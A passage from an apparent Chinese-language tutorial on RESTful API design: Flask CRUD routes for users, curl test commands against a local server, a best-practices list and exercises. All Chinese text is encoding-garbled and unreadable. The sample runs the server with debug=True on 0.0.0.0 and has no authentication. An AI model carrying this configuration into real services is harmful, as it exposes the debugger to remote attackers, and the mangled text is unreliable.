class="hljs-string">&quot;USER_NOT_FOUND&quot;</span>,<br>            status_code=<span class="hljs-number">404</span><br>        )<br><br>    <span class="hljs-keyword">return</span> success_response(user, <span class="hljs-string">&quot;è·å–ç”¨æˆ·æˆåŠŸ&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/api/v1/users&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_user</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    åˆ›å»ºæ–°ç”¨æˆ·</span><br><span class="hljs-string"></span><br><span class="hljs-string">    è¯·æ±‚ä½“ï¼š</span><br><span class="hljs-string">        &#123;</span><br><span class="hljs-string">            &quot;name&quot;: &quot;ç”¨æˆ·å&quot;,</span><br><span class="hljs-string">            &quot;email&quot;: &quot;é‚®ç®±&quot;,</span><br><span class="hljs-string">            &quot;role&quot;: &quot;è§’è‰²&quot;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    data = request.get_json()<br><br>    <span class="hljs-comment"># éªŒè¯å¿…å¡«å­—æ®µ</span><br>    required_fields = [<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;email&#x27;</span>]<br>    missing_fields = [f <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> required_fields <span class="hljs-keyword">if</span> f <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data]<br><br>    <span class="hljs-keyword">if</span> missing_fields:<br>        <span class="hljs-keyword">return</span> error_response(<br>            message=<span class="hljs-string">&quot;ç¼ºå°‘å¿…å¡«å­—æ®µ&quot;</span>,<br>            code=<span class="hljs-string">&quot;VALIDATION_ERROR&quot;</span>,<br>            details=[&#123;<span class="hljs-string">&quot;field&quot;</span>: f, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;æ­¤å­—æ®µä¸ºå¿…å¡«é¡¹&quot;</span>&#125; <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> missing_fields],<br>            status_code=<span class="hljs-number">422</span><br>        )<br><br>    <span class="hljs-comment"># éªŒè¯é‚®ç®±å”¯ä¸€æ€§</span><br>    email = data.get(<span class="hljs-string">&#x27;email&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(u[<span class="hljs-string">&#x27;email&#x27;</span>] == email <span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span> users_db.values()):<br>        <span class="hljs-keyword">return</span> error_response(<br>            message=<span class="hljs-string">&quot;é‚®ç®±å·²å­˜åœ¨&quot;</span>,<br>            code=<span class="hljs-string">&quot;EMAIL_EXISTS&quot;</span>,<br>            status_code=<span class="hljs-number">409</span><br>        )<br><br>    <span class="hljs-comment"># åˆ›å»ºç”¨æˆ·</span><br>    user_id = <span class="hljs-built_in">str</span>(uuid.uuid4())<br>    user = &#123;<br>        <span class="hljs-string">&quot;id&quot;</span>: user_id,<br>        <span class="hljs-string">&quot;name&quot;</span>: data[<span class="hljs-string">&#x27;name&#x27;</span>],<br>        <span class="hljs-string">&quot;email&quot;</span>: data[<span class="hljs-string">&#x27;email&#x27;</span>],<br>        <span class="hljs-string">&quot;role&quot;</span>: data.get(<span class="hljs-string">&#x27;role&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>),<br>        <span class="hljs-string">&quot;created_at&quot;</span>: datetime.now().isoformat(),<br>        <span class="hljs-string">&quot;updated_at&quot;</span>: datetime.now().isoformat()<br>    &#125;<br><br>    users_db[user_id] = user<br><br>    <span class="hljs-keyword">return</span> success_response(user, <span class="hljs-string">&quot;åˆ›å»ºç”¨æˆ·æˆåŠŸ&quot;</span>, <span class="hljs-number">201</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/api/v1/users/&lt;user_id&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;PUT&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_user</span>(<span class="hljs-params">user_id</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    å®Œæ•´æ›´æ–°ç”¨æˆ·</span><br><span class="hljs-string"></span><br><span class="hljs-string">    è·¯å¾„å‚æ•°ï¼š</span><br><span class="hljs-string">        user_id: ç”¨æˆ·ID</span><br><span class="hljs-string"></span><br><span class="hljs-string">    è¯·æ±‚ä½“ï¼š</span><br><span class="hljs-string">        &#123;</span><br><span class="hljs-string">            &quot;name&quot;: &quot;ç”¨æˆ·å&quot;,</span><br><span class="hljs-string">            &quot;email&quot;: &quot;é‚®ç®±&quot;,</span><br><span class="hljs-string">            &quot;role&quot;: &quot;è§’è‰²&quot;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> user_id <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> users_db:<br>        <span class="hljs-keyword">return</span> error_response(<br>            message=<span class="hljs-string">&quot;ç”¨æˆ·ä¸å­˜åœ¨&quot;</span>,<br>            code=<span class="hljs-string">&quot;USER_NOT_FOUND&quot;</span>,<br>            status_code=<span class="hljs-number">404</span><br>        )<br><br>    data = request.get_json()<br><br>    <span class="hljs-comment"># éªŒè¯å¿…å¡«å­—æ®µ</span><br>    required_fields = [<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;email&#x27;</span>]<br>    missing_fields = [f <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> required_fields <span class="hljs-keyword">if</span> f <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data]<br><br>    <span class="hljs-keyword">if</span> missing_fields:<br>        <span class="hljs-keyword">return</span> error_response(<br>            message=<span class="hljs-string">&quot;ç¼ºå°‘å¿…å¡«å­—æ®µ&quot;</span>,<br>            code=<span class="hljs-string">&quot;VALIDATION_ERROR&quot;</span>,<br>            details=[&#123;<span class="hljs-string">&quot;field&quot;</span>: f, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;æ­¤å­—æ®µä¸ºå¿…å¡«é¡¹&quot;</span>&#125; <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> missing_fields],<br>            status_code=<span class="hljs-number">422</span><br>        )<br><br>    <span class="hljs-comment"># æ›´æ–°ç”¨æˆ·</span><br>    users_db[user_id].update(&#123;<br>        <span class="hljs-string">&quot;name&quot;</span>: data[<span class="hljs-string">&#x27;name&#x27;</span>],<br>        <span class="hljs-string">&quot;email&quot;</span>: data[<span class="hljs-string">&#x27;email&#x27;</span>],<br>        <span class="hljs-string">&quot;role&quot;</span>: data.get(<span class="hljs-string">&#x27;role&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>),<br>        <span class="hljs-string">&quot;updated_at&quot;</span>: datetime.now().isoformat()<br>    &#125;)<br><br>    <span class="hljs-keyword">return</span> success_response(users_db[user_id], <span class="hljs-string">&quot;æ›´æ–°ç”¨æˆ·æˆåŠŸ&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/api/v1/users/&lt;user_id&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;PATCH&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch_user</span>(<span class="hljs-params">user_id</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    éƒ¨åˆ†æ›´æ–°ç”¨æˆ·</span><br><span class="hljs-string"></span><br><span class="hljs-string">    è·¯å¾„å‚æ•°ï¼š</span><br><span class="hljs-string">        user_id: ç”¨æˆ·ID</span><br><span class="hljs-string"></span><br><span class="hljs-string">    è¯·æ±‚ä½“ï¼šå¯ä»¥åªåŒ…å«è¦æ›´æ–°çš„å­—æ®µ</span><br><span class="hljs-string">        &#123;</span><br><span class="hljs-string">            &quot;name&quot;: &quot;æ–°ç”¨æˆ·å&quot;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> user_id <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> users_db:<br>        <span class="hljs-keyword">return</span> error_response(<br>            message=<span class="hljs-string">&quot;ç”¨æˆ·ä¸å­˜åœ¨&quot;</span>,<br>            code=<span class="hljs-string">&quot;USER_NOT_FOUND&quot;</span>,<br>            status_code=<span class="hljs-number">404</span><br>        )<br><br>    data = request.get_json()<br><br>    <span class="hljs-comment"># åªæ›´æ–°æä¾›çš„å­—æ®µ</span><br>    allowed_fields = [<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;email&#x27;</span>, <span class="hljs-string">&#x27;role&#x27;</span>]<br>    <span class="hljs-keyword">for</span> field <span class="hljs-keyword">in</span> allowed_fields:<br>        <span class="hljs-keyword">if</span> field <span class="hljs-keyword">in</span> data:<br>            users_db[user_id][field] = data[field]<br><br>    users_db[user_id][<span class="hljs-string">&#x27;updated_at&#x27;</span>] = datetime.now().isoformat()<br><br>    <span class="hljs-keyword">return</span> success_response(users_db[user_id], <span class="hljs-string">&quot;æ›´æ–°ç”¨æˆ·æˆåŠŸ&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/api/v1/users/&lt;user_id&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;DELETE&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_user</span>(<span class="hljs-params">user_id</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    åˆ é™¤ç”¨æˆ·</span><br><span class="hljs-string"></span><br><span class="hljs-string">    è·¯å¾„å‚æ•°ï¼š</span><br><span class="hljs-string">        user_id: ç”¨æˆ·ID</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> user_id <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> users_db:<br>        <span class="hljs-keyword">return</span> error_response(<br>            message=<span class="hljs-string">&quot;ç”¨æˆ·ä¸å­˜åœ¨&quot;</span>,<br>            code=<span class="hljs-string">&quot;USER_NOT_FOUND&quot;</span>,<br>            status_code=<span class="hljs-number">404</span><br>        )<br><br>    <span class="hljs-keyword">del</span> users_db[user_id]<br><br>    <span class="hljs-comment"># DELETEæˆåŠŸé€šå¸¸è¿”å›204 No Content</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">204</span><br><br><br><span class="hljs-comment"># ============================================================</span><br><span class="hljs-comment"># APIæ–‡æ¡£å’Œå¥åº·æ£€æŸ¥</span><br><span class="hljs-comment"># ============================================================</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/api/v1/health&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">health_check</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;å¥åº·æ£€æŸ¥&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> success_response(&#123;<br>        <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;healthy&quot;</span>,<br>        <span class="hljs-string">&quot;timestamp&quot;</span>: datetime.now().isoformat()<br>    &#125;)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/api/v1/docs&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">api_docs</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;APIæ–‡æ¡£&quot;&quot;&quot;</span><br>    docs = &#123;<br>        <span class="hljs-string">&quot;version&quot;</span>: <span class="hljs-string">&quot;1.0.0&quot;</span>,<br>        <span class="hljs-string">&quot;title&quot;</span>: <span class="hljs-string">&quot;ç”¨æˆ·ç®¡ç†API&quot;</span>,<br>        <span class="hljs-string">&quot;endpoints&quot;</span>: [<br>            &#123;<br>                <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/api/v1/users&quot;</span>,<br>                <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;GET&quot;</span>,<br>                <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;è·å–ç”¨æˆ·åˆ—è¡¨&quot;</span>,<br>                <span class="hljs-string">&quot;parameters&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;page&quot;</span>: <span class="hljs-string">&quot;é¡µç &quot;</span>,<br>                    <span class="hljs-string">&quot;limit&quot;</span>: <span class="hljs-string">&quot;æ¯é¡µæ•°é‡&quot;</span>,<br>                    <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;è§’è‰²è¿‡æ»¤&quot;</span>,<br>                    <span class="hljs-string">&quot;search&quot;</span>: <span class="hljs-string">&quot;æœç´¢&quot;</span>,<br>                    <span class="hljs-string">&quot;sort&quot;</span>: <span class="hljs-string">&quot;æ’åºå­—æ®µ&quot;</span>,<br>                    <span class="hljs-string">&quot;order&quot;</span>: <span class="hljs-string">&quot;æ’åºé¡ºåº&quot;</span><br>                &#125;<br>            &#125;,<br>            &#123;<br>                <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/api/v1/users/&lt;id&gt;&quot;</span>,<br>                <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;GET&quot;</span>,<br>                <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;è·å–æŒ‡å®šç”¨æˆ·&quot;</span><br>            &#125;,<br>            &#123;<br>                <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/api/v1/users&quot;</span>,<br>                <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>                <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;åˆ›å»ºæ–°ç”¨æˆ·&quot;</span>,<br>                <span class="hljs-string">&quot;body&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;ç”¨æˆ·åï¼ˆå¿…å¡«ï¼‰&quot;</span>,<br>                    <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;é‚®ç®±ï¼ˆå¿…å¡«ï¼‰&quot;</span>,<br>                    <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;è§’è‰²ï¼ˆå¯é€‰ï¼‰&quot;</span><br>                &#125;<br>            &#125;,<br>            &#123;<br>                <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/api/v1/users/&lt;id&gt;&quot;</span>,<br>                <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;PUT&quot;</span>,<br>                <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;å®Œæ•´æ›´æ–°ç”¨æˆ·&quot;</span><br>            &#125;,<br>            &#123;<br>                <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/api/v1/users/&lt;id&gt;&quot;</span>,<br>                <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;PATCH&quot;</span>,<br>                <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;éƒ¨åˆ†æ›´æ–°ç”¨æˆ·&quot;</span><br>            &#125;,<br>            &#123;<br>                <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/api/v1/users/&lt;id&gt;&quot;</span>,<br>                <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;DELETE&quot;</span>,<br>                <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;åˆ é™¤ç”¨æˆ·&quot;</span><br>            &#125;<br>        ]<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> success_response(docs)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—</span><br><span class="hljs-string">    â•‘       RESTful API æœåŠ¡å™¨                                  â•‘</span><br><span class="hljs-string">    â•‘       User Management API                                â•‘</span><br><span class="hljs-string">    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•</span><br><span class="hljs-string"></span><br><span class="hljs-string">    APIåœ°å€: http://127.0.0.1:5000/api/v1</span><br><span class="hljs-string"></span><br><span class="hljs-string">    å¯ç”¨ç«¯ç‚¹:</span><br><span class="hljs-string">    - GET    /api/v1/users          è·å–ç”¨æˆ·åˆ—è¡¨</span><br><span class="hljs-string">    - GET    /api/v1/users/&lt;id&gt;     è·å–æŒ‡å®šç”¨æˆ·</span><br><span class="hljs-string">    - POST   /api/v1/users          åˆ›å»ºæ–°ç”¨æˆ·</span><br><span class="hljs-string">    - PUT    /api/v1/users/&lt;id&gt;     æ›´æ–°ç”¨æˆ·ï¼ˆå®Œæ•´ï¼‰</span><br><span class="hljs-string">    - PATCH  /api/v1/users/&lt;id&gt;     æ›´æ–°ç”¨æˆ·ï¼ˆéƒ¨åˆ†ï¼‰</span><br><span class="hljs-string">    - DELETE /api/v1/users/&lt;id&gt;     åˆ é™¤ç”¨æˆ·</span><br><span class="hljs-string">    - GET    /api/v1/health         å¥åº·æ£€æŸ¥</span><br><span class="hljs-string">    - GET    /api/v1/docs           APIæ–‡æ¡£</span><br><span class="hljs-string"></span><br><span class="hljs-string">    æµ‹è¯•å‘½ä»¤:</span><br><span class="hljs-string">    # è·å–æ‰€æœ‰ç”¨æˆ·</span><br><span class="hljs-string">    curl http://127.0.0.1:5000/api/v1/users</span><br><span class="hljs-string"></span><br><span class="hljs-string">    # åˆ›å»ºç”¨æˆ·</span><br><span class="hljs-string">    curl -X POST http://127.0.0.1:5000/api/v1/users \\</span><br><span class="hljs-string">      -H &quot;Content-Type: application/json&quot; \\</span><br><span class="hljs-string">      -d &#x27;&#123;&quot;name&quot;:&quot;æµ‹è¯•ç”¨æˆ·&quot;,&quot;email&quot;:&quot;test@example.com&quot;&#125;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    # è·å–å•ä¸ªç”¨æˆ·</span><br><span class="hljs-string">    curl http://127.0.0.1:5000/api/v1/users/&lt;user_id&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    # æ›´æ–°ç”¨æˆ·</span><br><span class="hljs-string">    curl -X PATCH http://127.0.0.1:5000/api/v1/users/&lt;user_id&gt; \\</span><br><span class="hljs-string">      -H &quot;Content-Type: application/json&quot; \\</span><br><span class="hljs-string">      -d &#x27;&#123;&quot;name&quot;:&quot;æ–°åå­—&quot;&#125;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    # åˆ é™¤ç”¨æˆ·</span><br><span class="hljs-string">    curl -X DELETE http://127.0.0.1:5000/api/v1/users/&lt;user_id&gt;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>)<br><br>    app.run(debug=<span class="hljs-literal">True</span>, host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><hr><h2 id="5-APIæµ‹è¯•"><a href="#5-APIæµ‹è¯•" class="headerlink" title="5. APIæµ‹è¯•"></a>5. APIæµ‹è¯•</h2><h3 id="5-1-ä½¿ç”¨curlæµ‹è¯•"><a href="#5-1-ä½¿ç”¨curlæµ‹è¯•" class="headerlink" title="5.1 ä½¿ç”¨curlæµ‹è¯•"></a>5.1 ä½¿ç”¨curlæµ‹è¯•</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. è·å–æ‰€æœ‰ç”¨æˆ·</span><br>curl http://127.0.0.1:5000/api/v1/users<br><br><span class="hljs-comment"># 2. åˆ†é¡µå’Œè¿‡æ»¤</span><br>curl <span class="hljs-string">&quot;http://127.0.0.1:5000/api/v1/users?page=1&amp;limit=10&amp;role=admin&quot;</span><br><br><span class="hljs-comment"># 3. åˆ›å»ºç”¨æˆ·</span><br>curl -X POST http://127.0.0.1:5000/api/v1/users \<br>  -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>  -d <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">    &quot;name&quot;: &quot;æ–°ç”¨æˆ·&quot;,</span><br><span class="hljs-string">    &quot;email&quot;: &quot;new@example.com&quot;,</span><br><span class="hljs-string">    &quot;role&quot;: &quot;user&quot;</span><br><span class="hljs-string">  &#125;&#x27;</span><br><br><span class="hljs-comment"># 4. è·å–å•ä¸ªç”¨æˆ·</span><br>curl http://127.0.0.1:5000/api/v1/users/&lt;user_id&gt;<br><br><span class="hljs-comment"># 5. æ›´æ–°ç”¨æˆ·ï¼ˆPUT - å®Œæ•´æ›´æ–°ï¼‰</span><br>curl -X PUT http://127.0.0.1:5000/api/v1/users/&lt;user_id&gt; \<br>  -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>  -d <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">    &quot;name&quot;: &quot;æ›´æ–°çš„ç”¨æˆ·&quot;,</span><br><span class="hljs-string">    &quot;email&quot;: &quot;updated@example.com&quot;,</span><br><span class="hljs-string">    &quot;role&quot;: &quot;admin&quot;</span><br><span class="hljs-string">  &#125;&#x27;</span><br><br><span class="hljs-comment"># 6. æ›´æ–°ç”¨æˆ·ï¼ˆPATCH - éƒ¨åˆ†æ›´æ–°ï¼‰</span><br>curl -X PATCH http://127.0.0.1:5000/api/v1/users/&lt;user_id&gt; \<br>  -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>  -d <span class="hljs-string">&#x27;&#123;&quot;name&quot;: &quot;åªæ›´æ–°åå­—&quot;&#125;&#x27;</span><br><br><span class="hljs-comment"># 7. åˆ é™¤ç”¨æˆ·</span><br>curl -X DELETE http://127.0.0.1:5000/api/v1/users/&lt;user_id&gt;<br><br><span class="hljs-comment"># 8. å¥åº·æ£€æŸ¥</span><br>curl http://127.0.0.1:5000/api/v1/health<br></code></pre></td></tr></table></figure><hr><h2 id="6-æœ€ä½³å®è·µæ€»ç»“"><a href="#6-æœ€ä½³å®è·µæ€»ç»“" class="headerlink" title="6. æœ€ä½³å®è·µæ€»ç»“"></a>6. æœ€ä½³å®è·µæ€»ç»“</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">RESTful APIè®¾è®¡æœ€ä½³å®è·µï¼š<br><br>1. ä½¿ç”¨åè¯è¡¨ç¤ºèµ„æºï¼Œç”¨HTTPæ–¹æ³•è¡¨ç¤ºæ“ä½œ<br>   âœ… GET /users<br>   âŒ GET /getUsers<br><br>2. ä½¿ç”¨å¤æ•°å½¢å¼<br>   âœ… /users, /products<br>   âŒ /user, /product<br><br>3. ä½¿ç”¨æ­£ç¡®çš„HTTPçŠ¶æ€ç <br>   200: æˆåŠŸ<br>   201: åˆ›å»ºæˆåŠŸ<br>   204: åˆ é™¤æˆåŠŸ<br>   400: è¯·æ±‚é”™è¯¯<br>   401: æœªè®¤è¯<br>   403: æ— æƒé™<br>   404: æœªæ‰¾åˆ°<br>   500: æœåŠ¡å™¨é”™è¯¯<br><br>4. æä¾›ç‰ˆæœ¬æ§åˆ¶<br>   /api/v1/users<br><br>5. æ”¯æŒåˆ†é¡µã€è¿‡æ»¤ã€æ’åº<br>   ?page=1&amp;<span class="hljs-built_in">limit</span>=20&amp;<span class="hljs-built_in">sort</span>=name<br><br>6. ä½¿ç”¨ç»Ÿä¸€çš„å“åº”æ ¼å¼<br>   &#123;<br>     <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>     <span class="hljs-string">&quot;data&quot;</span>: &#123;...&#125;<br>   &#125;<br><br>7. æä¾›æ¸…æ™°çš„é”™è¯¯ä¿¡æ¯<br>   &#123;<br>     <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>     <span class="hljs-string">&quot;error&quot;</span>: &#123;<br>       <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&quot;VALIDATION_ERROR&quot;</span>,<br>       <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;è¯¦ç»†é”™è¯¯ä¿¡æ¯&quot;</span><br>     &#125;<br>   &#125;<br><br>8. ä½¿ç”¨HTTPSä¿æŠ¤API<br>9. å®ç°è®¤è¯å’Œæˆæƒï¼ˆJWTæ¨èï¼‰<br>10. æä¾›å®Œå–„çš„APIæ–‡æ¡£<br>11. å®ç°è¯·æ±‚é™æµï¼ˆRate Limitingï¼‰<br>12. ä½¿ç”¨ç¼“å­˜æé«˜æ€§èƒ½<br>13. è®°å½•å®Œæ•´çš„æ—¥å¿—<br>14. ç¼–å†™å®Œå–„çš„æµ‹è¯•<br></code></pre></td></tr></table></figure><hr><h2 id="7-ä»Šæ—¥ç»ƒä¹ "><a href="#7-ä»Šæ—¥ç»ƒä¹ " class="headerlink" title="7. ä»Šæ—¥ç»ƒä¹ "></a>7. ä»Šæ—¥ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 1ï¼šè®¾è®¡åšå®¢API"><a href="#ç»ƒä¹ 1ï¼šè®¾è®¡åšå®¢API" class="headerlink" title="ç»ƒä¹ 1ï¼šè®¾è®¡åšå®¢API"></a>ç»ƒä¹ 1ï¼šè®¾è®¡åšå®¢API</h3><p>è®¾è®¡ä¸€ä¸ªåšå®¢ç³»ç»Ÿçš„RESTful APIï¼ŒåŒ…å«ï¼š</p><ul><li>æ–‡ç« ï¼ˆarticlesï¼‰</li><li>è¯„è®ºï¼ˆcommentsï¼‰</li><li>æ ‡ç­¾ï¼ˆtagsï¼‰</li></ul><p>è¦æ±‚ï¼š</p><ol><li>è®¾è®¡åˆç†çš„URI</li><li>é€‰æ‹©æ­£ç¡®çš„HTTPæ–¹æ³•</li><li>è€ƒè™‘èµ„æºä¹‹é—´çš„å…³ç³»</li></ol><h3 id="ç»ƒä¹ 2ï¼šå®ç°äº§å“API"><a href="#ç»ƒä¹ 2ï¼šå®ç°äº§å“API" class="headerlink" title="ç»ƒä¹ 2ï¼šå®ç°äº§å“API"></a>ç»ƒä¹ 2ï¼šå®ç°äº§å“API</h3><p>æ‰©å±•ç¤ºä¾‹ä»£ç ï¼Œå®ç°äº§å“ç®¡ç†APIï¼š</p><ul><li>äº§å“CRUDæ“ä½œ</li><li>åˆ†ç±»è¿‡æ»¤</li><li>ä»·æ ¼åŒºé—´æŸ¥è¯¢</li><li>åº“å­˜ç®¡ç†</li></ul><h3 id="ç»ƒä¹ 3ï¼šAPIæµ‹è¯•"><a href="#ç»ƒä¹ 3ï¼šAPIæµ‹è¯•" class="headerlink" title="ç»ƒä¹ 3ï¼šAPIæµ‹è¯•"></a>ç»ƒä¹ 